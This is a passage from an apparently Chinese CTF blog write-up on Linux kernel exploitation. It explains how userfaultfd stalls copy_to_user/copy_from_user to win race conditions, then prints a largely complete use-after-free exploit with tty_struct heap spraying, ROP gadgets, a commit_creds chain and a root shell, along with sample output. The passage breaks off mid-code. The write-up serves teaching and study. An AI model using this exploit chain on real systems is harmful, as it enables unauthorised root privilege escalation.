class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span>        <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 读取返回的uffd_msg信息 */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"read(uffd)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">assert</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">==</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: flag=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: addr=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* userfaultfd处理程序：通过ioctl处理异常，这里使用的是UFFDIO_COPY，将用户自定义数据写到dummy     page，再拷贝到faulting page上 */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (1)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (2)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>dummy_page<span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_COPY)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>主线程触发异常</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们已经使用mmap在用户空间分配了两个匿名页，并注册了userfaultfd，对于前两个strcpy，第一次访问会导致缺页异常，因此会触发userfaultfd处理程序。如下图中前两次都出现了返回的uffd_msg信息</p></li></ol><p><img src="/EXP_FILE/6704f61e3cc202dabb0710864b4658ce_MD5.jpeg"></p><hr><p>一些补充的内容：</p><p><code>poll()</code> 的本质与 select() 类似，用于监视并等待多个文件描述符的属性变化。不过与 select() 不同，poll() 没有最大文件描述符数量的限制，但是当文件描述符数量过大时，性能可能会下降。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span> </span><span class="token keyword">int</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pollfd</span> <span class="token operator">*</span>fds<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> nfds<span class="token punctuation">,</span> <span class="token keyword">int</span> timeout<span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>fds</code> : 指向pollfd结构体数组，用于存放需要检测器状态的Socket描述符或其它文件描述符。</li><li><code>nfds</code>：指定pollfd 结构体数组的个数，即监控几个pollfd.</li><li><code>timeout</code>：指poll()调用阻塞的时间，单位是ms。<ul><li>-1 表示一直阻塞，直到有事件产生；</li><li>0 表示非阻塞，立即返回；</li><li>大于 0 表示设置一个超时时间。</li></ul></li><li>返回值<ul><li>成功时，poll() 返回结构体中 revents 域不为 0 的文件描述符个数。</li><li>如果在超时前没有任何事件发生，poll() 返回 0。</li><li>失败时，poll() 返回 -1，并设置 errno 为相应的错误码（如 EBADF、EFAULT、EINTR 等）。</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pollfd</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>  <span class="token comment">//委托内核检测的文件描述符</span>    <span class="token keyword">short</span> events<span class="token punctuation">;</span><span class="token comment">//委托内核检测的fd事件（输入、输出、错误），每一个事件有多个取值</span>    <span class="token keyword">short</span> revents<span class="token punctuation">;</span><span class="token comment">//这是一个传出参数，数据由内核写入，存储内核检测之后的结果</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是一些常见的事件标记：</p><ul><li>POLLIN：表示数据可读。</li><li>POLLPRI：表示紧急数据可读（例如 TCP 套接字的带外数据）。</li><li>POLLOUT：表示数据可写。</li><li>POLLERR：表示发生错误（只在返回的事件中）。</li><li>POLLNVAL：表示文件描述符未打开（已关闭）。</li></ul><h3 id="利用userfaultfd进行竞争"><a href="#利用userfaultfd进行竞争" class="headerlink" title="利用userfaultfd进行竞争"></a>利用userfaultfd进行竞争</h3><p>为什么userfaultfd可以用于提高内核竞态条件漏洞利用成功率呢？</p><p>其实，我们之前的大部分内核漏洞利用过程大体都可以抽象为一次或多次的用户空间与内核空间的数据交换。例如：</p><ol><li>用户空间从内核空间中获取数据，从而获得内核符号地址。</li><li>用户空间向内核空间写数据，从而在内核中布置ROP链或其他载荷。</li><li>用户空间执行触发漏洞的系统调用，劫持控制流。</li></ol><p>其中，第1步和第2步都需要对用户空间的内存进行写或读操作。那么，内核对用户空间内存页的第一次读或写操作都将触发缺页异常，<strong>在userfaultfd机制下，控制流将回到异常处理线程上，也就是从内核空间回到了用户空间</strong>！这样一来，攻击者得以有机会在真正的对用户空间内存写（对应第1步，通常是内核<code>copy_to_user</code>函数过程中）或读（对应第2步，通常是内核<code>copy_from_user</code>函数过程中）操作发生前施加控制。</p><blockquote><p>除非您知道程序集级别何时发生页面错误，否则调试似乎很困难。</p></blockquote><h2 id="三-EXP"><a href="#三-EXP" class="headerlink" title="(三)EXP"></a>(三)EXP</h2><h3 id="UAF-read"><a href="#UAF-read" class="headerlink" title="UAF read"></a>UAF read</h3><p>放一张brant-ruan大佬的思路图（UAF read）：<br><img src="/EXP_FILE/d8d9ea5bfb221feb4952695bffef14b3_MD5.jpeg"><br>简单来说，主线程首先在用户空间映射一个空白匿名页，然后触发<code>blob_get</code>，该函数末尾的<code>copy_to_user</code>将导致缺页异常，控制流回到异常处理线程，该线程制造UAF并堆喷<code>tty_struct</code>，最后<code>blob_get</code>恢复执行后将把<code>tty_struct</code>对象内容复制到空白匿名页中，实现地址泄露。</p><p>⚠需要注意的是，<code>copy_to_user</code>并不能把完整的一个<code>tty_struct</code>对象复制到用户空间：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/ # ./exp[*] Success to saveStatus![*] set cpu affinity[+] Dev Opened[*] set cpu affinity[*] fault_handler_thread: waiting for page fault...[+] uffd: flag=0x1[+] uffd: addr=0x7f9fc7dc700000: 0x000000000000000008: 0x000000000000000010: 0x000000000000000018: 0x000000000000000020: 0x000000000000000028: 0x000000000000000030: 0x000000000000000038: 0xffff888002f2f83840: 0xffff888002f2f83848: 0xffff888002f2f84850: 0xffff888002f2f84858: 0xffff888002de207060: 0x000000000000000068: 0x000000000000000070: 0xffff888002f2f87078: 0xffff888002f2f870[*] leak => 0x7e3c3c40[*] heap => 0xffff888002f2f838[x] Error: set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见<code>tty_struct</code>开头的数据没有被复制（本来<code>tty_operation</code>是有的，但是前0x30字节全是0）</p><p>⚠这是为什么呢？如果追踪该函数的源码，我们最终发现<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/lib/copy_user_64.S#L125">在汇编层面</a>它是不断循环迭代去复制数据的。在第一次迭代复制操作时触发缺页异常，然后我们才制造UAF。因此，第一次复制的数据来自UAF发生前的正常的blob对象。不过，复制的总大小决定了每次循环迭代复制的数据量（存储在寄存器中）。因此如果使用较小的大小（例如 0x20）进行调用，则只有前 0x10 字节将是 UAF 之前的数据，其余0x10 字节将在 UAF 之后复制。同理0x400也是一样的。</p><p>因此我们需要两次UAF来分别泄露内核基址和kheap地址。</p><h3 id="UAF-write"><a href="#UAF-write" class="headerlink" title="UAF write"></a>UAF write</h3><p>利用hander_thread，将fake_tty拷贝到faulting page，进而复制到内核堆空间。</p><p>(UAF write)<br><img src="/EXP_FILE/ce183b90d7139155d4df2382bfc3d808_MD5.jpeg"></p><p>如上图所示，作者在<code>blob_del</code>制造UAF前进行了一次堆喷，喷射了包含ropchain的对象。</p><p>这是因为之前泄露的堆地址<code>kheap</code>通常并不是这次UAF相关对象的堆地址，我们可以在内核空间喷射很多的fake_tty，且ops-&gt;ioctl &#x3D; kheap；只要有一命中就能够触发 stack pivot 并执行我们的ropchain</p><p>EXP如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xf1ec0001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xf1ec0002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xf1ec0003</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xf1ec0004</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff8109b0ed</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSD_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff81654bdb</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff81022fe3</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_CMP_EAX_0x415b005c_POP_RSP_RBP_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff8109b13a</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810729d0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff81072830</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> victim<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">pthread_t</span> monitor_thread<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token comment">/* Create and enable userfaultfd object */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>monitor_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_DEL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>id <span class="token operator">=</span> 